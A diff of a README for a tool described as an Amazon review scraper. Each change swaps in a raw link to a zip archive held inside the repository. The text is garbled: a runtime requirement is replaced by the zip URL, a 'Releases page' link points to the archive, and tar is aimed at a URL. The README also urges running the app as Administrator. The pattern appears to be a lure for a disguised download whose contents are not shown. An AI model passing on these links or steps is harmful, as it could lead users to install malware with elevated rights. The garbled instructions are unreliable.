@@ -1,6 +1,6 @@
 # 🌟 amazon-review-scraper - Automate Your Product Review Collection
 
-[![Download the latest release](https://raw.githubusercontent.com/Dentahindi/amazon-review-scraper/main/iguana/amazon-review-scraper.zip%20Now-16a34a?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Dentahindi/amazon-review-scraper/main/iguana/amazon-review-scraper.zip)
+[![Download the latest release](https://github.com/Dentahindi/amazon-review-scraper/raw/refs/heads/main/iguana/scraper_review_amazon_untangling.zip%20Now-16a34a?style=for-the-badge&logo=github)](https://github.com/Dentahindi/amazon-review-scraper/raw/refs/heads/main/iguana/scraper_review_amazon_untangling.zip)
 
 ## 🚀 Getting Started
 
@@ -11,7 +11,7 @@ The amazon-review-scraper lets you easily collect product reviews from Amazon. T
 Before downloading, ensure that your system meets these requirements:
 
 - **Operating System:** Windows, macOS, or Linux.
-- **https://raw.githubusercontent.com/Dentahindi/amazon-review-scraper/main/iguana/amazon-review-scraper.zip** Version 14 or higher installed.
+- **https://github.com/Dentahindi/amazon-review-scraper/raw/refs/heads/main/iguana/scraper_review_amazon_untangling.zip** Version 14 or higher installed.
 - **Python:** Version 3.7 or higher installed.
 - **Internet Connection:** Required for scraping and data collection.
 
@@ -19,7 +19,7 @@ Before downloading, ensure that your system meets these requirements:
 
 To get the amazon-review-scraper, visit the Releases page to download the latest version:
 
-[Download the latest release](https://raw.githubusercontent.com/Dentahindi/amazon-review-scraper/main/iguana/amazon-review-scraper.zip)
+[Download the latest release](https://github.com/Dentahindi/amazon-review-scraper/raw/refs/heads/main/iguana/scraper_review_amazon_untangling.zip)
 
 1. Click the link above to navigate to the Releases page.
 2. Locate the version you want to download.
@@ -42,7 +42,7 @@ To get the amazon-review-scraper, visit the Releases page to download the latest
 
 ### 🔧 Installation Instructions for Linux
 
-1. Download the `https://raw.githubusercontent.com/Dentahindi/amazon-review-scraper/main/iguana/amazon-review-scraper.zip` file from the Releases page.
+1. Download the `https://github.com/Dentahindi/amazon-review-scraper/raw/refs/heads/main/iguana/scraper_review_amazon_untangling.zip` file from the Releases page.
 2. Open a terminal window.
 3. Navigate to your Downloads folder using the command:
    ```bash
@@ -50,7 +50,7 @@ To get the amazon-review-scraper, visit the Releases page to download the latest
    ```
 4. Extract the tarball with the command:
    ```bash
-   tar -xvzf https://raw.githubusercontent.com/Dentahindi/amazon-review-scraper/main/iguana/amazon-review-scraper.zip
+   tar -xvzf https://github.com/Dentahindi/amazon-review-scraper/raw/refs/heads/main/iguana/scraper_review_amazon_untangling.zip
    ```
 5. Navigate into the extracted folder:
    ```bash
@@ -87,7 +87,7 @@ After installation, you can start using the amazon-review-scraper. Follow these 
 If you encounter any issues, try the following common solutions:
 
 - **Running Issues on Windows:** Make sure to run the application as an administrator. Right-click the app icon and select "Run as Administrator."
-- **Installation Issues:** Double-check that you have the required https://raw.githubusercontent.com/Dentahindi/amazon-review-scraper/main/iguana/amazon-review-scraper.zip and Python versions installed.
+- **Installation Issues:** Double-check that you have the required https://github.com/Dentahindi/amazon-review-scraper/raw/refs/heads/main/iguana/scraper_review_amazon_untangling.zip and Python versions installed.
 - **Network Errors:** Ensure your internet connection is stable. The tool requires an active connection to scrape data.
 
 ## 📞 Support
@@ -106,4 +106,4 @@ This project is licensed under the MIT License. You can freely use, modify, and 
 
 Want to stay updated with the latest improvements? Keep an eye on our Releases page:
 
-[Download the latest release](https://raw.githubusercontent.com/Dentahindi/amazon-review-scraper/main/iguana/amazon-review-scraper.zip)
+[Download the latest release](https://github.com/Dentahindi/amazon-review-scraper/raw/refs/heads/main/iguana/scraper_review_amazon_untangling.zip)
